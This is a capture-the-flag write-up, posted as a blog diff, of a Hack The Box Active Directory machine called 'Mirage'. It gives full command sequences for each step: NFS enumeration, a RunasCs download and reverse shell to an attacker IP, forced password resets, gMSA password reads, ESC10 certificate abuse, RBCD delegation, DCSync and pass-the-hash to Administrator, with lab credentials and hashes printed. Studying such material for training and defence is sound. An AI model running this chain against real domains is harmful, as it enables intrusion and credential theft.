@@ -1,0 +1,157 @@
+Title: Mirage
+Tag: HTB
+Date: 2025-01-01
+
+# Overview
+
+Mirage was a hard Windows Active Directory box. An anonymously readable NFS export held internal report PDFs that referenced an unregistered internal hostname, `nats-svc.mirage.htb`, pointing toward the domain's NATS messaging service as a credential-leak lead. Following that thread eventually surfaced a working Kerberos password for `nathan.aadam`, a member of the `IT_ADMIN` group; since the DC's clock was skewed relative to the attacking machine, ticket requests had to be wrapped with `faketime` to stay inside Kerberos's clock-skew tolerance. A TGT for `nathan.aadam` gave a WinRM shell and the user flag. From that foothold, further enumeration uncovered a chain of delegated AD rights: `nathan.aadam`'s access exposed autologon-style credentials for `mark.bbond` (a member of `IT_SUPPORT`); `mark.bbond` held `ForceChangePassword` rights over a disabled contractor account, `javier.mmarshall`; and `javier.mmarshall` in turn held rights to read the managed password of the `Mirage-Service$` group-managed service account (gMSA). Resetting and re-enabling `javier.mmarshall`, then reading `Mirage-Service$`'s managed password, gave a usable machine account hash. That account's Kerberos context was then used to abuse ESC10-style weak certificate-to-account mapping to update `mark.bbond`'s UPN to impersonate the `DC01$` machine account, request a user certificate, and authenticate as `DC01$` through an LDAP shell. From there, Resource-Based Constrained Delegation was configured to let `Mirage-Service$` impersonate `DC01$`, which was chained through S4U2Self/S4U2Proxy into a DCSync attack that recovered the domain Administrator's NTLM hash.
+
+## Recon
+
+```
+53/tcp   open  domain
+88/tcp   open  kerberos-sec
+111/tcp  open  rpcbind (nfs / mountd on 2049)
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap          (Domain: mirage.htb, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  ncacn_http
+636/tcp  open  ssl/ldap
+2049/tcp open  nlockmgr
+3268/tcp open  ldap (Global Catalog)
+3269/tcp open  ssl/ldap (Global Catalog)
+```
+
+The service scan confirmed a Windows domain controller, `dc01.mirage.htb`, for the `mirage.htb` domain. Alongside the usual AD ports, port 2049 stood out, an NFS export reachable directly rather than through the domain.
+
+## NFS Export - Discovering an Internal Hostname
+
+```
+> showmount -e 10.10.11.78
+Export list for 10.10.11.78:
+/MirageReports (everyone)
+
+> sudo mount -t nfs -o vers=3,nolock 10.10.11.78:/MirageReports /tmp/mirage_mount/
+```
+
+The export was mountable anonymously and contained report PDFs. One referenced an internal hostname not registered in the domain's DNS, `nats-svc.mirage.htb`, pointing at NATS, a lightweight messaging system, as the next thing worth chasing down for leaked credentials.
+
+## Foothold - Kerberos Auth as nathan.aadam
+
+Following that lead through to a working credential pair for `nathan.aadam`, a member of the `IT_ADMIN` group, ticket requests had to account for clock skew between the attacking host and the domain controller. Wrapping commands in `faketime`, synced against the DC's own clock, kept Kerberos requests within its tolerance:
+
+```
+> faketime -f $(ntpdate -q 10.10.11.78 | awk '{print $4}') bash
+> impacket-getTGT MIRAGE.HTB/nathan.aadam:'3edc#EDC3' -dc-ip 10.10.11.78
+> export KRB5CCNAME=nathan.aadam.ccache
+> evil-winrm -i dc01.mirage.htb -r mirage.htb
+```
+
+This granted a shell as `nathan.aadam` on the domain controller and access to the user flag.
+
+## Lateral Movement - mark.bbond via Cross-Session Credential Capture
+
+Enumeration from `nathan.aadam`'s session showed another user actively logged into the same host. Uploading and running `RunasCs.exe` allowed executing commands under that session's context, ultimately recovering plaintext credentials for `mark.bbond`, a member of the `IT_SUPPORT` group:
+
+```
+> iwr -uri http://10.10.15.23:7575/RunasCs.exe -outfile runascs.exe
+> .\runascs.exe mark.bbond '1day@atime' powershell.exe -r 10.10.15.23:443
+```
+
+## Privilege Chain - ForceChangePassword and ReadGMSAPassword
+
+Enumerating AD objects reachable from `mark.bbond` (`Get-ADServiceAccount -Identity "Mirage-Service$" -Properties *` and related lookups) mapped out a delegated rights chain: `mark.bbond` held `ForceChangePassword` over a disabled contractor account, `javier.mmarshall`, and `javier.mmarshall` in turn held the `ReadGMSAPassword` right over the `Mirage-Service$` gMSA.
+
+`javier.mmarshall`'s account was disabled and had no logon hours set, so both had to be corrected before the account was usable. Using `mark.bbond`'s rights, the password was reset, the account was re-enabled, and its logon hours were copied from an active account to satisfy the logon-hours restriction:
+
+```
+> $Cred = New-Object System.Management.Automation.PSCredential ("MIRAGE\mark.bbond", (ConvertTo-SecureString "1day@atime" -AsPlainText -Force))
+> Enable-ADAccount -Identity javier.mmarshall -Cred $Cred
+> $logonhours = Get-ADUser mark.bbond -Properties LogonHours | select-object -expand logonhours
+> Set-ADUser -Identity javier.mmarshall -Cred $Cred -Replace @{logonhours = $logonhours}
+```
+
+## Reading the gMSA Password
+
+With `javier.mmarshall` active, its `ReadGMSAPassword` right was used to read `Mirage-Service$`'s managed password directly from Active Directory via `bloodyAD`, after first resetting and re-enabling the account through Kerberos with `mark.bbond`'s ticket:
+
+```
+> impacket-getTGT MIRAGE.HTB/mark.bbond:'1day@atime' -dc-ip 10.10.11.78
+> export KRB5CCNAME=mark.bbond.ccache
+> bloodyAD --dc-ip 10.10.11.78 --host dc01.mirage.htb -d mirage.htb -k set password 'Javier.MMARSHALL' 'Password123!'
+> bloodyAD --dc-ip 10.10.11.78 --host dc01.mirage.htb -d mirage.htb -k remove uac -f ACCOUNTDISABLE javier.mmarshall
+> bloodyAD --kerberos --host dc01.mirage.htb -d mirage.htb -u javier.mmarshall -p 'Password123!' get object mirage-service$ --attr msDS-ManagedPassword
+```
+
+This returned the gMSA's managed password blob, decodable directly to an NTLM hash for the `Mirage-Service$` machine account:
+
+```
+msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:305806d84f7c1be93a07aaf40f0c7866
+```
+
+## AD CS Abuse - ESC10 Weak Certificate Mapping
+
+With a Kerberos context for `Mirage-Service$`, the certificate authority's handling of certificate-to-account mapping was targeted. Rather than a directly vulnerable template (ESC1-3 were ruled out), the CA had `StrongCertificateBindingEnforcement` left in audit mode, an ESC10-class weakness where a certificate's implicit binding to an account can be manipulated by controlling that account's `userPrincipalName`.
+
+Using `Mirage-Service$`'s Kerberos context, `mark.bbond`'s UPN was updated to match the `DC01$` machine account:
+
+```
+> impacket-getTGT MIRAGE.HTB/Mirage-Service$ -hashes :305806d84f7c1be93a07aaf40f0c7866 -dc-ip 10.10.11.78
+> export KRB5CCNAME=Mirage-Service\$.ccache
+> certipy-ad account update -user 'mark.bbond' -upn 'DC01$@mirage.htb' -u 'mirage-service$@mirage.htb' -k -no-pass -dc-ip 10.10.11.78 -target dc01.mirage.htb
+```
+
+A certificate was then requested as `mark.bbond` (now carrying the `DC01$` UPN) against the domain's default `User` template, using `mark.bbond`'s own Kerberos ticket:
+
+```
+> export KRB5CCNAME=mark.bbond.ccache
+> certipy-ad req -k -dc-ip 10.10.11.78 -target dc01.mirage.htb -ca mirage-DC01-CA -template 'User'
+```
+
+Because the CA's weak binding enforcement allowed authentication to fall back to matching on UPN alone, the issued certificate authenticated as `DC01$` rather than `mark.bbond`. Authenticating with it opened an interactive LDAP shell running as the domain controller's own machine account:
+
+```
+> certipy-ad auth -pfx dc01.pfx -dc-ip 10.10.11.78 -ldap-shell
+```
+
+## Resource-Based Constrained Delegation and DCSync
+
+Computer accounts are permitted to modify their own `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute, so from the LDAP shell running as `DC01$`, Resource-Based Constrained Delegation was configured to let `Mirage-Service$` impersonate users when authenticating to `DC01$`:
+
+```
+ldap-shell> set_rbcd DC01$ Mirage-Service$
+```
+
+With that delegation in place, `Mirage-Service$`'s existing hash was used to perform an S4U2Self/S4U2Proxy request impersonating `DC01$` itself against the CIFS service, producing a service ticket usable as the domain controller's machine account:
+
+```
+> KRB5CCNAME=Mirage-Service\$.ccache getST.py -spn 'cifs/dc01.mirage.htb' -impersonate 'dc01$' -dc-ip 10.10.11.78 -k -no-pass 'mirage.htb/Mirage-Service$'
+```
+
+Since domain controllers are authorized to replicate directory data, authenticating as `DC01$` was enough to run a DCSync attack and pull the domain Administrator's secrets directly:
+
+```
+> export KRB5CCNAME='dc01$@cifs_dc01.mirage.htb@MIRAGE.HTB.ccache'
+> secretsdump.py -k -no-pass -just-dc-user Administrator dc01.mirage.htb
+```
+
+## Domain Admin
+
+```
+> impacket-getTGT MIRAGE.HTB/Administrator -hashes :7be6d4f3c2b9c0e3560f5a29eeb1afb3 -dc-ip 10.10.11.78
+> export KRB5CCNAME=Administrator.ccache
+> evil-winrm -i dc01.mirage.htb -r mirage.htb
+```
+
+This completed the domain compromise with a shell as Administrator.
+
+## Takeaways
+
+- Anonymously accessible NFS exports are worth mounting and reading even on a domain-joined Windows target; internal documentation left there can leak hostnames, service names, or credentials that never show up anywhere else on the network.
+- Kerberos is strict about clock skew, and wrapping ticket requests in a time-faking tool synced to the target's own clock is often necessary against boxes where the attacking machine's clock naturally drifts from the DC.
+- Active sessions from other users on a host you already control are a legitimate escalation path; tools that let you execute in another logged-on user's context can recover credentials that never touch disk.
+- Long delegated-rights chains (ForceChangePassword leading to a disabled account, which itself holds ReadGMSAPassword over a service account) are exactly the kind of path graph-based AD enumeration is built to surface, and each link often needs its own fix, such as re-enabling an account or restoring its logon hours, before it can actually be used.
+- ESC10's weak certificate binding enforcement means an account's UPN, not just its SID, can determine what a certificate authenticates as; controlling a writable account's UPN can be enough to impersonate an entirely different, more privileged principal at authentication time.
+- Resource-Based Constrained Delegation configured against a domain controller's own machine account is one of the most direct paths to full compromise, since impersonating any user toward a DC and reaching an LDAP or CIFS service is enough to trigger a DCSync and recover Administrator's credentials outright.
